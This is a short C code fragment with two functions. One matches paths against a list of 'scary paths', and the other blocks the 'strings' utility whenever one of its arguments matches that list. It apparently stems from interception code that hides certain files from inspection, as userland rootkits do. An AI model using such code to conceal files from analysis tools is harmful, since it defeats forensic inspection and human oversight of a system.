int scary_path(char *string){
    char *path;
    for(int i = 0; i < SCARY_PATHS_SIZE; i++){
        path = scary_paths[i];

        if(!fnmatch(path, string, FNM_PATHNAME)) return 1;
        else if(!strncmp(path, string, strlen(path))) return 1;
        else if(strstr(path, string)) return 1;
    }

    return 0;
}

int block_strings(const char *filename, char *const argv[]){
    if(argv[0] == NULL) return 0;

    int is_strings = !fnmatch("*/strings", filename, FNM_PATHNAME);
    if(!is_strings) return 0;

    for(int i = 0; argv[i] != NULL; i++)
        if(scary_path(argv[i]))
            return 1;

    return 0;
}